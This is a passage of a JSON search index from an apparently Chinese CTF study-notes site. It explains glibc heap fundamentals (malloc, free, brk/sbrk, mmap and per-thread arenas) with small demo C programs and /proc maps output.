\uff0c\u6240\u4ee5\u7a0b\u5e8f\u5c31\u4f1a\u7533\u8bf7\u5f88\u5927\u7684\u5185\u5b58\u7a7a\u95f4\uff0c\u4f46\u901a\u5e38\u6765\u8bf4\u90fd\u4f1a\u5931\u8d25\uff0c\u56e0\u4e3a\u7cfb\u7edf\u6ca1\u6709\u90a3\u4e48\u591a\u7684\u5185\u5b58\u53ef\u4ee5\u5206\u914d\u3002","title":"malloc"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#free","text":"\u5728 glibc \u7684 malloc.c \u4e2d\uff0cfree \u7684\u8bf4\u660e\u5982\u4e0b /* free(void* p) Releases the chunk of memory pointed to by p, that had been previously allocated using malloc or a related routine such as realloc. It has no effect if p is null. It can have arbitrary (i.e., bad!) effects if p has already been freed. Unless disabled (using mallopt), freeing very large spaces will when possible, automatically trigger operations that give back unused memory to the system, thus reducing program footprint. */ \u53ef\u4ee5\u770b\u51fa\uff0cfree \u51fd\u6570\u4f1a\u91ca\u653e\u7531 p \u6240\u6307\u5411\u7684\u5185\u5b58\u5757\u3002\u8fd9\u4e2a\u5185\u5b58\u5757\u6709\u53ef\u80fd\u662f\u901a\u8fc7 malloc \u51fd\u6570\u5f97\u5230\u7684\uff0c\u4e5f\u6709\u53ef\u80fd\u662f\u901a\u8fc7\u76f8\u5173\u7684\u51fd\u6570 realloc \u5f97\u5230\u7684\u3002 \u6b64\u5916\uff0c\u8be5\u51fd\u6570\u4e5f\u540c\u6837\u5bf9\u5f02\u5e38\u60c5\u51b5\u8fdb\u884c\u4e86\u5904\u7406 \u5f53 p \u4e3a\u7a7a\u6307\u9488\u65f6\uff0c\u51fd\u6570\u4e0d\u6267\u884c\u4efb\u4f55\u64cd\u4f5c\u3002 \u5f53 p \u5df2\u7ecf\u88ab\u91ca\u653e\u4e4b\u540e\uff0c\u518d\u6b21\u91ca\u653e\u4f1a\u51fa\u73b0\u4e71\u4e03\u516b\u7cdf\u7684\u6548\u679c\uff0c\u8fd9\u5176\u5b9e\u5c31\u662f double free \u3002 \u9664\u4e86\u88ab\u7981\u7528 (mallopt) \u7684\u60c5\u51b5\u4e0b\uff0c\u5f53\u91ca\u653e\u5f88\u5927\u7684\u5185\u5b58\u7a7a\u95f4\u65f6\uff0c\u7a0b\u5e8f\u4f1a\u5c06\u8fd9\u4e9b\u5185\u5b58\u7a7a\u95f4\u8fd8\u7ed9\u7cfb\u7edf\uff0c\u4ee5\u4fbf\u4e8e\u51cf\u5c0f\u7a0b\u5e8f\u6240\u4f7f\u7528\u7684\u5185\u5b58\u7a7a\u95f4\u3002 3","title":"free"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#_4","text":"\u5728\u524d\u9762\u63d0\u5230\u7684\u51fd\u6570\u4e2d\uff0c\u65e0\u8bba\u662f malloc \u51fd\u6570\u8fd8\u662f free \u51fd\u6570\uff0c\u6211\u4eec\u52a8\u6001\u7533\u8bf7\u548c\u91ca\u653e\u5185\u5b58\u65f6\uff0c\u90fd\u7ecf\u5e38\u4f1a\u4f7f\u7528\uff0c\u4f46\u662f\u5b83\u4eec\u5e76\u4e0d\u662f\u771f\u6b63\u4e0e\u7cfb\u7edf\u4ea4\u4e92\u7684\u51fd\u6570\u3002\u8fd9\u4e9b\u51fd\u6570\u80cc\u540e\u7684\u7cfb\u7edf\u8c03\u7528\u4e3b\u8981\u662f (s)brk \u51fd\u6570\u4ee5\u53ca mmap, munmap \u51fd\u6570\u3002 4 \u5982\u4e0b\u56fe\u6240\u793a\uff0c\u6211\u4eec\u4e3b\u8981\u8003\u8651\u5bf9\u5806\u8fdb\u884c\u7533\u8bf7\u5185\u5b58\u5757\u7684\u64cd\u4f5c\u3002","title":"\u5185\u5b58\u5206\u914d\u80cc\u540e\u7684\u7cfb\u7edf\u8c03\u7528"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#sbrk","text":"\u5bf9\u4e8e\u5806\u7684\u64cd\u4f5c\uff0c\u64cd\u4f5c\u7cfb\u7edf\u63d0\u4f9b\u4e86 brk \u51fd\u6570\uff0cglibc \u5e93\u63d0\u4f9b\u4e86 sbrk \u51fd\u6570\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u589e\u52a0 brk \u7684\u5927\u5c0f\u6765\u5411\u64cd\u4f5c\u7cfb\u7edf\u7533\u8bf7\u5185\u5b58\u3002 \u521d\u59cb\u65f6\uff0c\u5806\u7684\u8d77\u59cb\u5730\u5740 start_brk \u4ee5\u53ca\u5806\u7684\u5f53\u524d\u672b\u5c3e brk \u6307\u5411\u540c\u4e00\u5730\u5740\u3002\u6839\u636e\u662f\u5426\u5f00\u542f ASLR\uff0c\u4e24\u8005\u7684\u5177\u4f53\u4f4d\u7f6e\u4f1a\u6709\u6240\u4e0d\u540c \u4e0d\u5f00\u542f ASLR \u4fdd\u62a4\u65f6\uff0cstart_brk \u4ee5\u53ca brk \u4f1a\u6307\u5411 data/bss \u6bb5\u7684\u7ed3\u5c3e\u3002 \u5f00\u542f ASLR \u4fdd\u62a4\u65f6\uff0cstart_brk \u4ee5\u53ca brk \u4e5f\u4f1a\u6307\u5411\u540c\u4e00\u4f4d\u7f6e\uff0c\u53ea\u662f\u8fd9\u4e2a\u4f4d\u7f6e\u662f\u5728 data/bss \u6bb5\u7ed3\u5c3e\u540e\u7684\u968f\u673a\u504f\u79fb\u5904\u3002 \u5177\u4f53\u6548\u679c\u5982\u4e0b\u56fe\uff08\u8fd9\u4e2a\u56fe\u7247\u4e0e\u7f51\u4e0a\u6d41\u4f20\u7684\u57fa\u672c\u4e00\u81f4\uff0c\u8fd9\u91cc\u662f\u56e0\u4e3a\u8981\u753b\u4e00\u5f20\u5927\u56fe\uff0c\u6240\u4ee5\u81ea\u5df1\u5355\u72ec\u753b\u4e86\u4e0b\uff09\u6240\u793a \u4f8b\u5b50 /* sbrk and brk example */ #include <stdio.h> #include <unistd.h> #include <sys/types.h> int main () { void * curr_brk , * tmp_brk = NULL ; printf ( \"Welcome to sbrk example:%d \\n \" , getpid ()); /* sbrk(0) gives current program break location */ tmp_brk = curr_brk = sbrk ( 0 ); printf ( \"Program Break Location1:%p \\n \" , curr_brk ); getchar (); /* brk(addr) increments/decrements program break location */ brk ( curr_brk + 4096 ); curr_brk = sbrk ( 0 ); printf ( \"Program break Location2:%p \\n \" , curr_brk ); getchar (); brk ( tmp_brk ); curr_brk = sbrk ( 0 ); printf ( \"Program Break Location3:%p \\n \" , curr_brk ); getchar (); return 0 ; } //gcc sbrk_brk_example.c -m32 -o ./sbrk_brk_example \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u6bcf\u4e00\u6b21\u6267\u884c\u5b8c\u64cd\u4f5c\u540e\uff0c\u90fd\u6267\u884c\u4e86 getchar() \u51fd\u6570\uff0c\u8fd9\u662f\u4e3a\u4e86\u6211\u4eec\u65b9\u4fbf\u6211\u4eec\u67e5\u770b\u7a0b\u5e8f\u771f\u6b63\u7684\u6620\u5c04\u3002 \u5728\u7b2c\u4e00\u6b21\u8c03\u7528 brk \u4e4b\u524d \u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u53ef\u4ee5\u770b\u51fa\uff0c\u5e76\u6ca1\u6709\u51fa\u73b0\u5806\u3002\u56e0\u6b64 start_brk = brk = end_data = 0x806c000 \u7b2c\u4e00\u6b21\u589e\u52a0 brk \u540e \u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u53ef\u4ee5\u770b\u51fa\uff0c\u5df2\u7ecf\u51fa\u73b0\u4e86\u5806\u6bb5 start_brk = end_data = 0x806c000 brk = 0x806d000 \u5176\u4e2d\uff0c\u5173\u4e8e\u5806\u7684\u90a3\u4e00\u884c 0x806c000\u662f\u76f8\u5e94\u5806\u7684\u8d77\u59cb\u5730\u5740 rw-p \u8868\u660e\u5806\u5177\u6709\u53ef\u8bfb\u53ef\u5199\u6743\u9650\uff0c\u5e76\u4e14\u5c5e\u4e8e\u9690\u79c1\u6570\u636e\u3002 00000000 \u8868\u660e\u6587\u4ef6\u504f\u79fb\uff0c\u7531\u4e8e\u8fd9\u90e8\u5206\u5185\u5bb9\u5e76\u4e0d\u662f\u4ece\u6587\u4ef6\u4e2d\u6620\u5c04\u5f97\u5230\u7684\uff0c\u6240\u4ee5\u4e3a 0\u3002 00:00 \u662f\u4e3b\u4ece (Major/mirror) \u7684\u8bbe\u5907\u53f7\uff0c\u8fd9\u90e8\u5206\u5185\u5bb9\u4e5f\u4e0d\u662f\u4ece\u6587\u4ef6\u4e2d\u6620\u5c04\u5f97\u5230\u7684\uff0c\u6240\u4ee5\u4e5f\u90fd\u4e3a 0\u3002 0 \u8868\u793a\u7740 Inode \u53f7\u3002\u7531\u4e8e\u8fd9\u90e8\u5206\u5185\u5bb9\u5e76\u4e0d\u662f\u4ece\u6587\u4ef6\u4e2d\u6620\u5c04\u5f97\u5230\u7684\uff0c\u6240\u4ee5\u4e3a 0\u3002 \u7136\u540e\u901a\u8fc7 brk(tmp_brk); \u5c06\u6307\u9488\u5f52\u4f4d\u56de\u5230 0x806c000 \uff0c\u65b0\u51fa\u73b0\u7684 heap \u6d88\u5931\u3002\u5177\u4f53\u548c\u7b2c\u4e00\u6b65\u56fe\u4e00\u6837\uff0c\u4e0d\u8d34\u56fe\u4e86\u3002","title":"(s)brk"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#mmap","text":"malloc \u4f1a\u4f7f\u7528 mmap \u6765\u521b\u5efa\u72ec\u7acb\u7684\u533f\u540d\u6620\u5c04\u6bb5\u3002\u533f\u540d\u6620\u5c04\u7684\u76ee\u7684\u4e3b\u8981\u662f\u53ef\u4ee5\u7533\u8bf7\u4ee5 0 \u586b\u5145\u7684\u5185\u5b58\uff0c\u5e76\u4e14\u8fd9\u5757\u5185\u5b58\u4ec5\u88ab\u8c03\u7528\u8fdb\u7a0b\u6240\u4f7f\u7528\u3002 \u4f8b\u5b50 /* Private anonymous mapping example using mmap syscall */ #include <stdio.h> #include <sys/mman.h> #include <sys/types.h> #include <sys/stat.h> #include <fcntl.h> #include <unistd.h> #include <stdlib.h> void static inline errExit ( const char * msg ) { printf ( \"%s failed. Exiting the process \\n \" , msg ); exit ( -1 ); } int main () { int ret = -1 ; printf ( \"Welcome to private anonymous mapping example::PID:%d \\n \" , getpid ()); printf ( \"Before mmap \\n \" ); getchar (); char * addr = NULL ; addr = mmap ( NULL , ( size_t ) 132 * 1024 , PROT_READ | PROT_WRITE , MAP_PRIVATE | MAP_ANONYMOUS , -1 , 0 ); if ( addr == MAP_FAILED ) errExit ( \"mmap\" ); printf ( \"After mmap \\n \" ); getchar (); /* Unmap mapped region. */ ret = munmap ( addr , ( size_t ) 132 * 1024 ); if ( ret == -1 ) errExit ( \"munmap\" ); printf ( \"After munmap \\n \" ); getchar (); return 0 ; } \u5728\u6267\u884c mmap \u4e4b\u524d \u6211\u4eec\u53ef\u4ee5\u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u770b\u5230\uff0c\u76ee\u524d\u53ea\u6709. so \u6587\u4ef6\u7684 mmap \u6bb5\u3002 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps 08048000 -08049000 r-xp 00000000 08 :01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap 08049000 -0804a000 r--p 00000000 08 :01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap 0804a000-0804b000 rw-p 00001000 08 :01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap b7e21000-b7e22000 rw-p 00000000 00 :00 0 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ mmap \u540e \u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u53ef\u4ee5\u770b\u51fa\uff0c\u6211\u4eec\u7533\u8bf7\u7684\u5185\u5b58\u4e0e\u5df2\u7ecf\u5b58\u5728\u7684\u5185\u5b58\u6bb5\u7ed3\u5408\u5728\u4e86\u4e00\u8d77\u6784\u6210\u4e86 b7e00000 \u5230 b7e21000 \u7684 mmap \u6bb5\u3002 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps 08048000 -08049000 r-xp 00000000 08 :01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap 08049000 -0804a000 r--p 00000000 08 :01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap 0804a000-0804b000 rw-p 00001000 08 :01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap b7e00000-b7e22000 rw-p 00000000 00 :00 0 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ munmap \u4ece\u4e0b\u9762\u7684\u8f93\u51fa\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u539f\u6765\u7533\u8bf7\u7684\u5185\u5b58\u6bb5\u5df2\u7ecf\u6ca1\u6709\u4e86\uff0c\u5185\u5b58\u6bb5\u53c8\u6062\u590d\u4e86\u539f\u6765\u7684\u6837\u5b50\u4e86\u3002 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps 08048000-08049000 r-xp 00000000 08:01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap 08049000-0804a000 r--p 00000000 08:01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap 0804a000-0804b000 rw-p 00001000 08:01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap b7e21000-b7e22000 rw-p 00000000 00:00 0 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$","title":"mmap"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#_5","text":"\u5728\u539f\u6765\u7684 dlmalloc \u5b9e\u73b0\u4e2d\uff0c\u5f53\u4e24\u4e2a\u7ebf\u7a0b\u540c\u65f6\u8981\u7533\u8bf7\u5185\u5b58\u65f6\uff0c\u53ea\u6709\u4e00\u4e2a\u7ebf\u7a0b\u53ef\u4ee5\u8fdb\u5165\u4e34\u754c\u533a\u7533\u8bf7\u5185\u5b58\uff0c\u800c\u53e6\u5916\u4e00\u4e2a\u7ebf\u7a0b\u5219\u5fc5\u987b\u7b49\u5f85\u76f4\u5230\u4e34\u754c\u533a\u4e2d\u4e0d\u518d\u6709\u7ebf\u7a0b\u3002\u8fd9\u662f\u56e0\u4e3a\u6240\u6709\u7684\u7ebf\u7a0b\u5171\u4eab\u4e00\u4e2a\u5806\u3002\u5728 glibc \u7684 ptmalloc \u5b9e\u73b0\u4e2d\uff0c\u6bd4\u8f83\u597d\u7684\u4e00\u70b9\u5c31\u662f\u652f\u6301\u4e86\u591a\u7ebf\u7a0b\u7684\u5feb\u901f\u8bbf\u95ee\u3002\u5728\u65b0\u7684\u5b9e\u73b0\u4e2d\uff0c\u6240\u6709\u7684\u7ebf\u7a0b\u5171\u4eab\u591a\u4e2a\u5806\u3002 \u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2a\u4f8b\u5b50\u3002 /* Per thread arena example. */ #include <stdio.h> #include <stdlib.h> #include <pthread.h> #include <unistd.h> #include <sys/types.h> void* threadFunc(void* arg) { printf(\"Before malloc in thread 1\\n\"); getchar(); char* addr = (char*) malloc(1000); printf(\"After malloc and before free in thread 1\\n\"); getchar(); free(addr); printf(\"After free in thread 1\\n\"); getchar(); } int main() { pthread_t t1; void* s; int ret; char* addr; printf(\"Welcome to per thread arena example::%d\\n\",getpid()); printf(\"Before malloc in main thread\\n\"); getchar(); addr = (char*) malloc(1000); printf(\"After malloc and before free in main thread\\n\"); getchar(); free(addr); printf(\"After free in main thread\\n\"); getchar(); ret = pthread_create(&t1, NULL, threadFunc, NULL); if(ret) { printf(\"Thread creation error\\n\"); return -1; } ret = pthread_join(t1, &s); if(ret) { printf(\"Thread join error\\n\"); return -1; } return 0; } \u7b2c\u4e00\u6b21\u7533\u8bf7\u4e4b\u524d \uff0c \u6ca1\u6709\u4efb\u4f55\u4efb\u4f55\u5806\u6bb5\u3002 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread Welcome to per thread arena example::6501 Before malloc in main thread ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000-08049000 r-xp 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000-0804a000 r--p 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804a000-0804b000 rw-p 00001000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread b7e05000-b7e07000 rw-p 00000000 00:00 0 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ \u7b2c\u4e00\u6b21\u7533\u8bf7\u540e \uff0c \u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u53ef\u4ee5\u770b\u51fa\uff0c\u5806\u6bb5\u88ab\u5efa\u7acb\u4e86\uff0c\u5e76\u4e14\u5b83\u5c31\u7d27\u90bb\u7740\u6570\u636e\u6bb5\uff0c\u8fd9\u8bf4\u660e malloc \u7684\u80cc\u540e\u662f\u7528 brk \u51fd\u6570\u6765\u5b9e\u73b0\u7684\u3002\u540c\u65f6\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6211\u4eec\u867d\u7136\u53ea\u662f\u7533\u8bf7\u4e86 1000 \u4e2a\u5b57\u8282\uff0c\u4f46\u662f\u6211\u4eec\u5374\u5f97\u5230\u4e86 0x0806c000-0x0804b000=0x21000 \u4e2a\u5b57\u8282\u7684\u5806\u3002**\u8fd9\u8bf4\u660e\u867d\u7136\u7a0b\u5e8f\u53ef\u80fd\u53ea\u662f\u5411\u64cd\u4f5c\u7cfb\u7edf\u7533\u8bf7\u5f88\u5c0f\u7684\u5185\u5b58\uff0c\u4f46\u662f\u4e3a\u4e86\u65b9\u4fbf\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4f1a\u628a\u5f88\u5927\u7684\u5185\u5b58\u5206\u914d\u7ed9\u7a0b\u5e8f\u3002\u8fd9\u6837\u7684\u8bdd\uff0c\u5c31\u907f\u514d\u4e86\u591a\u6b21\u5185\u6838\u6001\u4e0e\u7528\u6237\u6001\u7684\u5207\u6362\uff0c\u63d0\u9ad8\u4e86\u7a0b\u5e8f\u7684\u6548\u7387\u3002**\u6211\u4eec\u79f0\u8fd9\u4e00\u5757\u8fde\u7eed\u7684\u5185\u5b58\u533a\u57df\u4e3a arena\u3002\u6b64\u5916\uff0c\u6211\u4eec\u79f0\u7531\u4e3b\u7ebf\u7a0b\u7533\u8bf7\u7684\u5185\u5b58\u4e3a main_arena\u3002\u540e\u7eed\u7684\u7533\u8bf7\u7684\u5185\u5b58\u4f1a\u4e00\u76f4\u4ece\u8fd9\u4e2a arena \u4e2d\u83b7\u53d6\uff0c\u76f4\u5230\u7a7a\u95f4\u4e0d\u8db3\u3002\u5f53 arena \u7a7a\u95f4\u4e0d\u8db3\u65f6\uff0c\u5b83\u53ef\u4ee5\u901a\u8fc7\u589e\u52a0 brk \u7684\u65b9\u5f0f\u6765\u589e\u52a0\u5806\u7684\u7a7a\u95f4\u3002\u7c7b\u4f3c\u5730\uff0carena \u4e5f\u53ef\u4ee5\u901a\u8fc7\u51cf\u5c0f brk \u6765\u7f29\u5c0f\u81ea\u5df1\u7684\u7a7a\u95f4\u3002 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread Welcome to per thread arena example::6501 Before malloc in main thread After malloc and before free in main thread ... sploitfun@sploitfun-VirtualBox:~/lsploits/hof/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000-08049000 r-xp 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000-0804a000 r--p 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804a000-0804b000 rw-p 00001000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804b000-0806c000 rw-p 00000000 00:00 0 [heap] b7e05000-b7e07000 rw-p 00000000 00:00 0 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ \u5728\u4e3b\u7ebf\u7a0b\u91ca\u653e\u5185\u5b58\u540e \uff0c\u6211\u4eec\u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u53ef\u4ee5\u770b\u51fa\uff0c\u5176\u5bf9\u5e94\u7684 arena \u5e76\u6ca1\u6709\u8fdb\u884c\u56de\u6536\uff0c\u800c\u662f\u4ea4\u7531 glibc \u6765\u8fdb\u884c\u7ba1\u7406\u3002\u5f53\u540e\u9762\u7a0b\u5e8f\u518d\u6b21\u7533\u8bf7\u5185\u5b58\u65f6\uff0c\u5728 glibc \u4e2d\u7ba1\u7406\u7684\u5185\u5b58\u5145\u8db3\u7684\u60c5\u51b5\u4e0b\uff0cglibc \u5c31\u4f1a\u6839\u636e\u5806\u5206\u914d\u7684\u7b97\u6cd5\u6765\u7ed9\u7a0b\u5e8f\u5206\u914d\u76f8\u5e94\u7684\u5185\u5b58\u3002 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread Welcome to per thread arena example::6501 Before malloc in main thread After malloc and before free in main thread After free in main thread ... sploitfun@sploitfun-VirtualBox:~/lsploits/hof/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000-08049000 r-xp 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000-0804a000 r--p 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804a000-0804b000 rw-p 00001000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804b000-0806c000 rw-p 00000000 00:00 0 [heap] b7e05000-b7e07000 rw-p 00000000 00:00 0 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ \u5728\u7b2c\u4e00\u4e2a\u7ebf\u7a0b malloc \u4e4b\u524d \uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u5e76\u6ca1\u6709\u51fa\u73b0\u4e0e\u7ebf\u7a0b 1 \u76f8\u5173\u7684\u5806\uff0c\u4f46\u662f\u51fa\u73b0\u4e86\u4e0e\u7ebf\u7a0b 1 \u76f8\u5173\u7684\u6808\u3002 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread Welcome to per thread arena example::6501 Before malloc in main thread After malloc and before free in main thread After free in main thread Before malloc in thread 1 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000-08049000 r-xp 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000-0804a000 r--p 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804a000-0804b000 rw-p 00001000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804b000-0806c000 rw-p 00000000 00:00 0 [heap] b7604000-b7605000 ---p 00000000 00:00 0 b7605000-b7e07000 rw-p 00000000 00:00 0 [stack:6594] ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ \u7b2c\u4e00\u4e2a\u7ebf\u7a0b malloc \u540e \uff0c \u6211\u4eec\u53ef\u4ee5\u4ece\u4e0b\u9762\u8f93\u51fa\u770b\u51fa\u7ebf\u7a0b 1 \u7684\u5806\u6bb5\u88ab\u5efa\u7acb\u4e86\u3002\u800c\u4e14\u5b83\u6240\u5728\u7684\u4f4d\u7f6e\u4e3a\u5185\u5b58\u6620\u5c04\u6bb5\u533a\u57df\uff0c\u540c\u6837\u5927\u5c0f\u4e5f\u662f 132KB(b7500000-b7521000)\u3002\u56e0\u6b64\u8fd9\u8868\u660e\u8be5\u7ebf\u7a0b\u7533\u8bf7\u7684\u5806\u65f6\uff0c\u80cc\u540e\u5bf9\u5e94\u7684\u51fd\u6570\u4e3a mmap \u51fd\u6570\u3002\u540c\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\u5b9e\u9645\u771f\u7684\u5206\u914d\u7ed9\u7a0b\u5e8f\u7684\u5185\u5b58\u4e3a 1M(b7500000-b7600000)\u3002\u800c\u4e14\uff0c\u53ea\u6709 132KB \u7684\u90e8\u5206\u5177\u6709\u53ef\u8bfb\u53ef\u5199\u6743\u9650\uff0c\u8fd9\u4e00\u5757\u8fde\u7eed\u7684\u533a\u57df\u6210\u4e3a thread arena\u3002 \u6ce8\u610f\uff1a \u5f53\u7528\u6237\u8bf7\u6c42\u7684\u5185\u5b58\u5927\u4e8e 128KB \u65f6\uff0c\u5e76\u4e14\u6ca1\u6709\u4efb\u4f55 arena \u6709\u8db3\u591f\u7684\u7a7a\u95f4\u65f6\uff0c\u90a3\u4e48\u7cfb\u7edf\u5c31\u4f1a\u6267\u884c mmap \u51fd\u6570\u6765\u5206\u914d\u76f8\u5e94\u7684\u5185\u5b58\u7a7a\u95f4\u3002\u8fd9\u4e0e\u8fd9\u4e2a\u8bf7\u6c42\u6765\u81ea\u4e8e\u4e3b\u7ebf\u7a0b\u8fd8\u662f\u4ece\u7ebf\u7a0b\u65e0\u5173\u3002 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread Welcome to per thread arena example::6501 Before malloc in main thread After malloc and before free in main thread After free in main thread Before malloc in thread 1 After malloc and before free in thread 1 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000-08049000 r-xp 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000-0804a000 r--p 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804a000-0804b000 rw-p 00001000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804b000-0806c000 rw-p 00000000 00:00 0 [heap] b7500000-b7521000 rw-p 00000000 00:00 0 b7521000-b7600000 ---p 00000000 00:00 0 b7604000-b7605000 ---p 00000000 00:00 0 b7605000-b7e07000 rw-p 00000000 00:00 0 [stack:6594] ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ \u5728\u7b2c\u4e00\u4e2a\u7ebf\u7a0b\u91ca\u653e\u5185\u5b58\u540e \uff0c \u6211\u4eec\u53ef\u4ee5\u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u770b\u5230\uff0c\u8fd9\u6837\u91ca\u653e\u5185\u5b58\u540c\u6837\u4e0d\u4f1a\u628a\u5185\u5b58\u91cd\u65b0\u7ed9\u7cfb\u7edf\u3002 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread Welcome to per thread arena example::6501 Before malloc in main thread After malloc and before free in main thread After free in main thread Before malloc in thread 1 After malloc and before free in thread 1 After free in thread 1 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000-08049000 r-xp 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000-0804a000 r--p 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804a000-0804b000 rw-p 00001000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804b000-0806c000 rw-p 00000000 00:00 0 [heap] b7500000-b7521000 rw-p 00000000 00:00 0 b7521000-b7600000 ---p 00000000 00:00 0 b7604000-b7605000 ---p 00000000 00:00 0 b7605000-b7e07000 rw-p 00000000 00:00 0 [stack:6594] ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$","title":"\u591a\u7ebf\u7a0b\u652f\u6301"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#_6","text":"\u5185\u5bb9\u7edd\u5927\u90e8\u5206\u6765\u81eactf-wiki\uff0c\u6587\u7ae0\u7528\u4e8e\u81ea\u5df1\u5b66\u4e60\u8bb0\u5f55 \u5806\u7684\u64cd\u4f5c\u5c31\u8fd9\u4e48\u590d\u6742\uff0c\u90a3\u4e48\u5728 glibc \u5185\u90e8\u5fc5\u7136\u4e5f\u6709\u7cbe\u5fc3\u8bbe\u8ba1\u7684\u6570\u636e\u7ed3\u6784\u6765\u7ba1\u7406\u5b83\u3002\u4e0e\u5806\u76f8\u5e94\u7684\u6570\u636e\u7ed3\u6784\u4e3b\u8981\u5206\u4e3a \u5b8f\u89c2\u7ed3\u6784\uff0c\u5305\u542b\u5806\u7684\u5b8f\u89c2\u4fe1\u606f\uff0c\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e9b\u6570\u636e\u7ed3\u6784\u7d22\u5f15\u5806\u7684\u57fa\u672c\u4fe1\u606f\u3002 